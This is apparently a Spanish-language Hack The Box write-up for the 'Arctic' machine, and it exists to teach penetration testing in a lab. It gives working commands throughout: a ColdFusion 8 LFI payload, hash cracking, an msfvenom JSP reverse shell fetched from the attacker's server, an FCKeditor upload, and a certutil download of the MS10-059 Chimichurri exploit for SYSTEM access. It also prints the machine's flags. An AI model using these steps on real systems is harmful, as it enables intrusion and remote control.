# Hack The Box — Arctic (Windows, Easy) · Write-up (ES)

**Objetivo**: Obtener `user.txt` y `root.txt` en *Arctic* explotando ColdFusion 8 y escalando a SYSTEM con MS10-059 (*Chimichurri*).  
**IP**: `10.129.130.255` · **Fecha**: 2025-09-08 03:12:25

---

## Resumen rápido
- **Servicios**: `135/tcp` y `49154/tcp` (MSRPC), `8500/tcp` (**JRun Web Server / ColdFusion 8**).  
- **Foothold**: LFI en `enter.cfm` → extraer `password.properties` → crackear SHA-1 (`happyday`) → entrar al **ColdFusion Administrator** → **Scheduled Task** que descarga y guarda un **JSP reverse shell** → shell como usuario (`tolis`).  
- **PrivEsc**: **MS10-059** (*Chimichurri*) → **NT AUTHORITY\SYSTEM**.  
- **Flags**:  
  - `C:\Users\tolis\Desktop\user.txt` → `2c0a8a1abc53b21e740e54bc6b9f4d49`  
  - `C:\Users\Administrator\Desktop\root.txt` → `331c7c9c73134ec4eb19d713df471eaf`

> El puerto **8500** es **muy lento** (30–60 s por request). Usar `curl -I` y `--max-time` ayuda.

---

## 1) Recon

```bash
# Full scan (conservador para evitar drops)
nmap -p- -sS -n -Pn -T3 --min-rate 200 --max-retries 3 10.129.130.255 -oA scans/full

# Servicios
nmap -sC -sV -p135,8500,49154 -n -Pn 10.129.130.255 -oA scans/serv
# 8500/tcp open  http  JRun Web Server (ColdFusion 8)
```

Comprobaciones web:
```bash
curl -I --max-time 75 http://10.129.130.255:8500/CFIDE/
curl -I --max-time 75 http://10.129.130.255:8500/cfdocs/
```

---

## 2) Foothold — LFI → Admin → Scheduled Task → JSP

### 2.1 LFI para `password.properties`
```bash
curl -s "http://10.129.130.255:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en" | tee password.properties

grep -i '^password=' password.properties | cut -d= -f2 > cf.hash
```

Crack del SHA-1:
```bash
sudo apt update && sudo apt install -y wordlists
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt cf.hash
john --show cf.hash
# → happyday
```

> Alternativa sin crack: calcular `hex_hmac_sha1(salt, sha1_hex(password))` con el `salt` del form y pegar el HMAC como contraseña (desactivando el JS del form).

### 2.2 Login al **ColdFusion Administrator**
```
http://10.129.130.255:8500/CFIDE/administrator/
```
**Password**: `happyday`

### 2.3 Preparar reverse shell JSP
```bash
ip -4 addr show tun0 | awk '/inet /{print $2}' | cut -d/ -f1
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<TU_IP_TUN0> LPORT=443 -f raw -o shell.jsp
python3 -m http.server 80
rlwrap nc -lvnp 443
```

### 2.4 Scheduled Task para guardar el JSP en el webroot
En el panel: **Debugging & Logging → Scheduled Tasks → New**  
- **Task Name**: `revjsp`  
- **URL**: `http://<TU_IP_TUN0>/shell.jsp`  
- **Save output to a file**: ✔  
- **File**: `C:\ColdFusion8\wwwroot\rev.jsp` *(o `...\CFIDE\rev.jsp`)*  
- **Path is absolute**: ✔ → **Run**

Disparo:
```bash
curl --max-time 75 "http://10.129.130.255:8500/rev.jsp"
# o: http://10.129.130.255:8500/CFIDE/rev.jsp
```

**Plan B (si no hay salida a Internet)** — *Upload FCKeditor*:
```bash
curl -s -X POST -F "newfile=@shell.jsp" \
 "http://10.129.130.255:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/"
curl --max-time 75 "http://10.129.130.255:8500/userfiles/file/shell.jsp"
```

### 2.5 User flag
```cmd
type C:\Users\tolis\Desktop\user.txt
```

---

## 3) PrivEsc — **MS10-059 (Chimichurri)**

### 3.1 Confirmación
```cmd
systeminfo
# Windows Server 2008 R2 build 7600 (sin hotfixes) → vulnerable
```

### 3.2 Descarga y ejecución
En Kali:
```bash
python3 -m http.server 80
rlwrap nc -lvnp 5555
```
En la víctima:
```cmd
cd C:\Windows\Temp
certutil -urlcache -f http://<TU_IP_TUN0>/Chimichurri.exe C:\Windows\Temp\chim.exe
C:\Windows\Temp\chim.exe <TU_IP_TUN0> 5555
```
> Si `certutil` “descarga” pero el archivo no aparece, limpiar cache y usar **ruta absoluta**. Alternativas: PowerShell, BITSAdmin o SMB (`impacket-smbserver`).

### 3.3 Root flag
```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## 4) Limpieza
```cmd
del C:\Windows\Temp\chim*.exe
del C:\ColdFusion8\wwwroot\rev.jsp
# Borrar Scheduled Task desde el CF Admin
```

---

## 5) Troubleshooting breve
- **:8500 lento** → requests mínimas, `--max-time` y `curl -I`.  
- **404 en /CFIDE/rev.jsp** → guardá en `wwwroot` y probá `/rev.jsp`.  
- **Sin egress** → usa upload FCKeditor.  
- **Reverse no conecta** → probá puertos 443/80/8080.  
- **certutil “OK” sin archivo** → usar ruta absoluta o cache copy.  

---

## 6) Checklist (para Obsidian)
- [ ] Nmap full + servicios  
- [ ] Confirmar `CFIDE/` y `cfdocs/`  
- [ ] LFI `password.properties`  
- [ ] Crack → `happyday`  
- [ ] Login CF Admin  
- [ ] Scheduled Task → `rev.jsp`  
- [ ] Reverse (user)  
- [ ] `systeminfo`  
- [ ] *Chimichurri* → SYSTEM  
- [ ] `user.txt` y `root.txt`  
- [ ] Limpieza
